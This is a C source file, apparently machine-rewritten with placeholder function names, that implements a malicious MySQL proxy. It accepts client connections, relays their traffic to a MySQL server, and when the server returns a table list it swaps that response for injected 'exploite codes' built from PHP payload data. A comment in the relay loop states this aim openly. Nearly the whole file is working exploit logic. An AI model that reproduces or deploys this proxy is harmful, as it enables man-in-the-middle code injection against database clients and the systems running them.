#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  fd_set ;

/* Variables and functions */
 int BUFFER_LEN ; 
 char* DATABASE ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  SHUT_RDWR ; 
 int FUNC3 (int,struct sockaddr*,int*) ; 
 int FUNC4 (char*,int /*<<< orphan*/ ,char**) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int FUNC9 () ; 
 scalar_t__ FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int /*<<< orphan*/  phpcodes ; 
 size_t FUNC12 (int,char*,int) ; 
 int FUNC13 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC14 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC15 (int,char*,size_t) ; 

int FUNC16(int argc,char* argv[])
{
	struct sockaddr_in ina1;
	int ina1_l;
	int s_daemon,s_mysql;
	size_t byte_read,byte_written;
	char *buf;
	int sc,event,n_select;
	fd_set rfds;
        struct timeval tv;	 
	int exptlen,i;
	char *expt;
	char *dbname=DATABASE;
	
	buf = (char*) FUNC10(sizeof(char) * (BUFFER_LEN));
	tv.tv_sec  = 15;
	tv.tv_usec = 0;
	
	/* we listen to port */
	 s_daemon = FUNC9();
    
	exptlen = FUNC4(dbname,phpcodes,&expt);

	for(;;) 
	{
	   FUNC7(stderr,"waiting for connection\n");
	   
	   if( -1 == (sc = FUNC3(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) ) 
		  FUNC11("accept()");
	   /* if we get here, we have a new connection */
	   FUNC7(stderr,"got client connection\n");
mysql:
	   /* connect to mysql */
	   s_mysql = FUNC6();
        
	   for(;;) 
	    {
	   	FUNC2(&rfds);
	        FUNC1(sc,&rfds);
  	   	FUNC1(s_mysql,&rfds);                                
		
	        n_select = (sc > s_mysql)? sc : s_mysql;

	    	event = FUNC13(n_select+1,&rfds,NULL,NULL,NULL);
	    	if(-1  == event) 
		    FUNC11("select()");
	        else 
		{	
		    if(FUNC0(s_mysql,&rfds)) 
		     {
			byte_read = FUNC12(s_mysql,buf,BUFFER_LEN);
		    	/* check for closing client connection*/
		    	if(byte_read == 0) 
	  	        {
			   FUNC14(s_mysql,SHUT_RDWR);
			   FUNC5(s_mysql);
			   goto mysql;
		        }

			 /* check data received from mysql server.
			  * if  buf[11] contain 'T', data received from   mysq server is table list
			  *
			  * NOW we replace the table with our exploite codes and send them to client
			  */
		        if( 'T' == buf[11])
			{
		           for(i=0;i<exptlen;i++) 
		              buf[i] = expt[i];
		           byte_read = exptlen;
		        }
		       
		        if(FUNC15(sc, buf, byte_read) < 0)
		           break; 
		     }
	           
	             if(FUNC0(sc,&rfds)) 
		     {	
	   	         byte_read = FUNC12(sc,buf,BUFFER_LEN);
		         /* check for closing client connection*/
		         if(byte_read == 0) 
		         {	
			    FUNC5(sc);    
			    break;
		         }

		       if(FUNC15(s_mysql,buf,byte_read) < 0) 
			       break; 	    
		     }    
#if defined(DEBUG)		     
		     fprintf(stderr,"data:\n");	
		     for(i=0;i<byte_read;i++) 
			     fprintf(stderr," %c(%x) ",buf[i],buf[i]);
#endif    
	        }   

	    } 
	}
	FUNC8(buf);
	FUNC8(expt);
	return 0;
}